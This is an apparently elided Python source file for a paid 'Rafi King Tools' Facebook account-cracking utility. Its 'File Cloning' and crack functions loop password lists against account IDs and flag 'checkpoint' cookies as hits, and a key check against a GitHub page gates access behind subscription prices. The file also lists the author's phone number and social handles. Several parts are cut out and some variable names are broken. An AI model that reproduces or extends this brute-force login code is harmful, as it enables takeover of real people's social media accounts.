...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Rafi' and password == 'King':
...
os.system('espeak -a 300 " Welcome,   to,  Rafi,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/profile.php?id=61551867295669&mibextid=ZbWKwL')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mRAFI XHOWDHURY ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • ARIYAN RAFI]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mrafixhowdhury990 ]   ║\33[1;34m   
╠══[Whatsapp                 • +8801301668047 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 4.7 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	RAFIj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	RAFIj('\033[0;97m===============================================')
	RAFI= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if RAFI in ['m']:
		public()
	elif RAFI in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801301668047')
	elif TRAFI in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[RAFI-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Rafi,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/rafixhowdhury990").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		os.system("clear")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m TUTUL AR MAIRE XHUDI")
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Rafi King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Rafi+key1)
